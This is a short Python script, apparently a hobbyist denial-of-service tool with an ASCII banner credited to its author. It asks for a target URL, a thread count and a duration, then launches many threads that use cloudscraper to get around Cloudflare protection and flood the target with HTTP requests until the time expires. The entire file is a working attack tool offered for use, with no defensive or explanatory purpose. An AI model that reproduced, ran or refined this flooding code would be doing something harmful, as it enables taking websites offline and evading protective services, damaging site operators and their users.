import threading, cloudscraper, datetime, time
from colorama import Fore, init
init(convert=True)

def LaunchCFB(url, threadss, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threadss):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except:
            pass

if __name__ == '__main__':
    print(Fore.LIGHTGREEN_EX+""" \
PPPP  DDD  K  K BBBB  L    fb: Phạm Đăng Khoa 
P   P D  D K K  B   B L    
PPPP  D  D KK   BBBB  L    
P     D  D K K  B   B L    
P     DDD  K  K BBBB  LLLL 403
                            """)
    print(Fore.MAGENTA+" [PDKBL403] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
    target = input()
    print(Fore.MAGENTA+" [PDKBL403] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
    thread = input()
    print(Fore.MAGENTA+" [PDKBL403] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
    t = input()
    print(Fore.MAGENTA+" [PDKBL403] "+Fore.WHITE+"Attacking => "+target+" for "+t+" seconds")
    LaunchCFB(target, thread, t)
    time.sleep(int(t))
    print(Fore.MAGENTA+"\n [PDKBL403] "+Fore.WHITE+"Attack complete.")